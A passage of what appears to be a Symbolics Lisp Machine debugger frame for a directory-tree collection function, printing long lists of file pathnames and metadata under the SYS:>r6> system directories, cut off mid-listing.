"B:>sys>r6>l-fep>v24-2mw.flod.8"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715311776 :MODIFICATION-DATE 2715311776 :CREATION-DATE 2690837251 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v24-debug.flod.1"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311777 :MODIFICATION-DATE 2715311777 :CREATION-DATE 2668185626 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v22-debug.flod.14"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311779 :MODIFICATION-DATE 2715311779 :CREATION-DATE 2659307364 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v18-debug.flod.13"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311781 :MODIFICATION-DATE 2715311781 :CREATION-DATE 2658802390 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v17-debug.flod.13"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311782 :MODIFICATION-DATE 2715311782 :CREATION-DATE 2658802324 :AUTHOR ...) ...) (("sys" "r6" "l-ucode") (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310048 :MODIFICATION-DATE 2715310048 :CREATION-DATE 2706029650 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.mic.336"> :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2715310052 :MODIFICATION-DATE 2715310052 :CREATION-DATE 2706029573 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310056 :MODIFICATION-DATE 2715310056 :CREATION-DATE 2706029662 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310069 :MODIFICATION-DATE 2715310069 :CREATION-DATE 2706030558 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.mic.336"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2721163780 :MODIFICATION-DATE 2721163664 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310079 :MODIFICATION-DATE 2715310079 :CREATION-DATE 2706030580 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310094 :MODIFICATION-DATE 2715310094 :CREATION-DATE 2706030956 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.mic.336"> :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2715310099 :MODIFICATION-DATE 2715310099 :CREATION-DATE 2706030881 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310102 :MODIFICATION-DATE 2715310102 :CREATION-DATE 2706030965 :AUTHOR ...) ...) (("sys" "r6" "demo") (#<LMFS-PATHNAME "B:>sys>r6>demo>sysdcl.lisp.8"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2722517740 :MODIFICATION-DATE 2715310620 :CREATION-DATE 2669904466 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>hakdef.lisp.24"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722750507 :MODIFICATION-DATE 2715310621 :CREATION-DATE 2651197246 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>abacus.lisp.21"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517748 :MODIFICATION-DATE 2715310622 :CREATION-DATE 2665771082 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>alarm.lisp.25"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2722517707 :MODIFICATION-DATE 2715310623 :CREATION-DATE 2659026159 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>crock.lisp.11"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2723527373 :MODIFICATION-DATE 2715310624 :CREATION-DATE 2678495666 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>dc.lisp.8"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517780 :MODIFICATION-DATE 2715310627 :CREATION-DATE 2665767394 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>deutsc.lisp.36"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722517783 :MODIFICATION-DATE 2715310628 :CREATION-DATE 2666102486 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>dlwhak.lisp.44"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517787 :MODIFICATION-DATE 2715310629 :CREATION-DATE 2678839931 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>geb.lisp.37"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2722517792 :MODIFICATION-DATE 2715310631 :CREATION-DATE 2665767397 :AUTHOR ...) ...) (("sys" "r6" "window") (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310645 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.bin.2"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310678 :MODIFICATION-DATE 2715310678 :CREATION-DATE 2693854259 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.lisp.2"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721355323 :MODIFICATION-DATE 2715310679 :CREATION-DATE 2693854201 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>tvdefs.lisp.299"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2723217727 :MODIFICATION-DATE 2715313214 :CREATION-DATE 2695333742 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>ltvdef.lisp.26"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2721355326 :MODIFICATION-DATE 2715313215 :CREATION-DATE 2670634442 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>bitblt.lisp.27"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2721353613 :MODIFICATION-DATE 2715313217 :CREATION-DATE 2705428791 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>lscreen.lisp.122"> :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2723572526 :MODIFICATION-DATE 2715313219 :CREATION-DATE 2695417117 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>scrman.lisp.190"> :LENGTH-IN-BLOCKS 11 :REFERENCE-DATE 2722545156 :MODIFICATION-DATE 2715313220 :CREATION-DATE 2683785409 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>sheet.lisp.611"> :LENGTH-IN-BLOCKS 26 :REFERENCE-DATE 2723510182 :MODIFICATION-DATE 2715313224 :CREATION-DATE 2695332143 :AUTHOR ...) ...) (("sys" "r6" "fonts") (#<LMFS-PATHNAME "B:>sys>r6>fonts>tv.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310648 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>nlgp1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310718 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>lgp-1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715311937 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>lgp2.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715317314 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>nlgp2.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715317319 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>dmp1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2718304162 :AUTHOR ...)) (("sys" "r6" "examples") (#<LMFS-PATHNAME "B:>sys>r6>examples>smile.bin.5"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310681 :MODIFICATION-DATE 2715310681 :CREATION-DATE 2682020263 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>smile.lisp.24"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2715310682 :MODIFICATION-DATE 2715310682 :CREATION-DATE 2688760179 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>server-finger.bin.6"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310683 :MODIFICATION-DATE 2715310683 :CREATION-DATE 2700257372 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>server-finger.lisp.6"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310685 :MODIFICATION-DATE 2715310685 :CREATION-DATE 2700249930 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>overlap.bin.7"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2720472250 :MODIFICATION-DATE 2719863383 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>overlap.lisp.16"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2719863449 :MODIFICATION-DATE 2715310687 :CREATION-DATE 2688760130 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>mouse-sen.bin.4"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310688 :MODIFICATION-DATE 2715310688 :CREATION-DATE 2682020085 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>mouse-sen.lisp.9"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310689 :MODIFICATION-DATE 2715310689 :CREATION-DATE 2688760132 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>audio-examples.bin.5"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310690 :MODIFICATION-DATE 2715310690 :CREATION-DATE 2665054027 :AUTHOR ...) ...) (("sys" "r6" "zmail") (#<LMFS-PATHNAME "B:>sys>r6>zmail>template-examples.lisp.2"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722163021 :MODIFICATION-DATE 2715310718 :CREATION-DATE 2615192148 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>patch.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715313416 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>window.lisp.425"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 11 :REFERENCE-DATE 2722163020 :MODIFICATION-DATE 2720108376 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>universe.lisp.95"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2722163013 :MODIFICATION-DATE 2720108379 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>undo.lisp.14"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2722162994 :MODIFICATION-DATE 2720108380 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>top.lisp.715"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 13 :REFERENCE-DATE 2722162993 :MODIFICATION-DATE 2720108382 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>template.lisp.110"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 9 :REFERENCE-DATE 2722162985 :MODIFICATION-DATE 2720108385 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>template-library.lisp.108"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2722162980 :MODIFICATION-DATE 2720108387 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>system.lisp.38"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722162971 :MODIFICATION-DATE 2720108388 :CREATION-DATE ...) ...) (("sys" "r6" "hardcopy") (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>sysdcl.lisp.22"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2723442483 :MODIFICATION-DATE 2715311751 :CREATION-DATE 2695486624 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>fontw.lisp.29"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2718838090 :MODIFICATION-DATE 2715311753 :CREATION-DATE 2683775306 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>press.lisp.51"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2723442463 :MODIFICATION-DATE 2715311754 :CREATION-DATE 2702056428 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>dpress.lisp.30"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2723442427 :MODIFICATION-DATE 2715311756 :CREATION-DATE 2677800192 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>defs.lisp.10"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2723442416 :MODIFICATION-DATE 2715311757 :CREATION-DATE 2669843245 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>press-defs.lisp.6"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2723442467 :MODIFICATION-DATE 2715311758 :CREATION-DATE 2666058082 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>printer.lisp.42"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2723599588 :MODIFICATION-DATE 2715311760 :CREATION-DATE 2702390318 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>stream.lisp.210"> :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2723442481 :MODIFICATION-DATE 2715311762 :CREATION-DATE 2702253135 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>xgp.lisp.16"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2723442486 :MODIFICATION-DATE 2715311763 :CREATION-DATE 2697908942 :AUTHOR ...) ...) (("sys" "r6" "print") (#<LMFS-PATHNAME "B:>sys>r6>print>sysdcl.lisp.11"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721851361 :MODIFICATION-DATE 2715312135 :CREATION-DATE 2642191502 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>sysdcl.bin.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721851361 :MODIFICATION-DATE 2715312136 :CREATION-DATE 2679342641 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>request.lisp.75"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2721851370 :MODIFICATION-DATE 2715312138 :CREATION-DATE 2699625263 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>request.bin.10"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2721851373 :MODIFICATION-DATE 2715312139 :CREATION-DATE 2676324590 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>spooler.lisp.93"> :LENGTH-IN-BLOCKS 7 :REFERENCE-DATE 2721851384 :MODIFICATION-DATE 2715312141 :CREATION-DATE 2699894206 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>spooler.bin.9"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2721851386 :MODIFICATION-DATE 2715312142 :CREATION-DATE 2676324632 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>device.lisp.77"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2721851395 :MODIFICATION-DATE 2715312143 :CREATION-DATE 2702057341 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>device.bin.9"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2721851396 :MODIFICATION-DATE 2715312145 :CREATION-DATE 2676324647 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>lgp.lisp.101"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2721851402 :MODIFICATION-DATE 2715312146 :CREATION-DATE 2697640141 :AUTHOR ...) ...) ...)

TV:COLLECT-FSEDIT-RECURSIVE-WILD-DIRECTORY-NODE:  (P.C. = 44)
   Arg 0 (TV:ROOT-NODE): #<DIRECTORY-TREE 25636123>
   Arg 1 (TV:PATH): #<LOGICAL-PATHNAME "SYS: *; *.*.*">
   Arg 2 (TV:DESCRIPTION): (("sys") (("sys" "site")) (("sys" "facilities")) (("sys" "r6") (("sys" "r6" "diagnostics")) (("sys" "r6" "dna")) (("sys" "r6" "interlisp")) (("sys" "r6" "prolog")) (("sys" "r6" "pascal")) (("sys" "r6" "fortran")) (("sys" "r6" "press-fonts")) (("sys" "r6" "macsyma")) (("sys" "r6" "ip-tcp")) ...))
   Arg 3 (TV:ALIST): ((("sys" "r6" "doc") (#<LMFS-PATHNAME "B:>sys>r6>doc>zmacs.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715306764 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>doc.lisp.33"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715312215 :MODIFICATION-DATE 2715312215 :CREATION-DATE 2700230603 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>sage.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312216 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>rn6.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312220 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>rn6-1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312237 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>nota.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312256 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>user.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312261 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>lms.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312271 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>ined.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312277 :AUTHOR ...) ...) (("sys" "r6" "l-fep") (#<LMFS-PATHNAME "B:>sys>r6>l-fep>philips-io4.sync.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310033 :MODIFICATION-DATE 2715310033 :CREATION-DATE 2677444385 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>philips-io2.sync.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310035 :MODIFICATION-DATE 2715310035 :CREATION-DATE 2677444384 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>moniterm-io4.sync.4"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310036 :MODIFICATION-DATE 2715310036 :CREATION-DATE 2660167554 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>moniterm-io2.sync.4"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310038 :MODIFICATION-DATE 2715310038 :CREATION-DATE 2660168030 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v24-2mw.flod.8"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715311776 :MODIFICATION-DATE 2715311776 :CREATION-DATE 2690837251 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v24-debug.flod.1"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311777 :MODIFICATION-DATE 2715311777 :CREATION-DATE 2668185626 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v22-debug.flod.14"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311779 :MODIFICATION-DATE 2715311779 :CREATION-DATE 2659307364 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v18-debug.flod.13"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311781 :MODIFICATION-DATE 2715311781 :CREATION-DATE 2658802390 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v17-debug.flod.13"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311782 :MODIFICATION-DATE 2715311782 :CREATION-DATE 2658802324 :AUTHOR ...) ...) (("sys" "r6" "l-ucode") (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310048 :MODIFICATION-DATE 2715310048 :CREATION-DATE 2706029650 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.mic.336"> :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2715310052 :MODIFICATION-DATE 2715310052 :CREATION-DATE 2706029573 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310056 :MODIFICATION-DATE 2715310056 :CREATION-DATE 2706029662 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310069 :MODIFICATION-DATE 2715310069 :CREATION-DATE 2706030558 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.mic.336"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2721163780 :MODIFICATION-DATE 2721163664 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310079 :MODIFICATION-DATE 2715310079 :CREATION-DATE 2706030580 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310094 :MODIFICATION-DATE 2715310094 :CREATION-DATE 2706030956 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.mic.336"> :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2715310099 :MODIFICATION-DATE 2715310099 :CREATION-DATE 2706030881 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310102 :MODIFICATION-DATE 2715310102 :CREATION-DATE 2706030965 :AUTHOR ...) ...) (("sys" "r6" "demo") (#<LMFS-PATHNAME "B:>sys>r6>demo>sysdcl.lisp.8"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2722517740 :MODIFICATION-DATE 2715310620 :CREATION-DATE 2669904466 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>hakdef.lisp.24"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722750507 :MODIFICATION-DATE 2715310621 :CREATION-DATE 2651197246 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>abacus.lisp.21"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517748 :MODIFICATION-DATE 2715310622 :CREATION-DATE 2665771082 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>alarm.lisp.25"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2722517707 :MODIFICATION-DATE 2715310623 :CREATION-DATE 2659026159 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>crock.lisp.11"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2723527373 :MODIFICATION-DATE 2715310624 :CREATION-DATE 2678495666 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>dc.lisp.8"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517780 :MODIFICATION-DATE 2715310627 :CREATION-DATE 2665767394 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>deutsc.lisp.36"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722517783 :MODIFICATION-DATE 2715310628 :CREATION-DATE 2666102486 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>dlwhak.lisp.44"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517787 :MODIFICATION-DATE 2715310629 :CREATION-DATE 2678839931 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>geb.lisp.37"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2722517792 :MODIFICATION-DATE 2715310631 :CREATION-DATE 2665767397 :AUTHOR ...) ...) (("sys" "r6" "window") (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310645 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.bin.2"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310678 :MODIFICATION-DATE 2715310678 :CREATION-DATE 2693854259 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.lisp.2"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721355323 :MODIFICATION-DATE 2715310679 :CREATION-DATE 2693854201 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>tvdefs.lisp.299"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2723217727 :MODIFICATION-DATE 2715313214 :CREATION-DATE 2695333742 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>ltvdef.lisp.26"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2721355326 :MODIFICATION-DATE 2715313215 :CREATION-DATE 2670634442 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>bitblt.lisp.27"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2721353613 :MODIFICATION-DATE 2715313217 :CREATION-DATE 2705428791 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>lscreen.lisp.122"> :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2723572526 :MODIFICATION-DATE 2715313219 :CREATION-DATE 2695417117 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>scrman.lisp.190"> :LENGTH-IN-BLOCKS 11 :REFERENCE-DATE 2722545156 :MODIFICATION-DATE 2715313220 :CREATION-DATE 2683785409 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>sheet.lisp.611"> :LENGTH-IN-BLOCKS 26 :REFERENCE-DATE 2723510182 :MODIFICATION-DATE 2715313224 :CREATION-DATE 2695332143 :AUTHOR ...) ...) (("sys" "r6" "fonts") (#<LMFS-PATHNAME "B:>sys>r6>fonts>tv.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310648 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>nlgp1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310718 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>lgp-1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715311937 :AUTHOR ...) (#<LMFS-PATHNAME 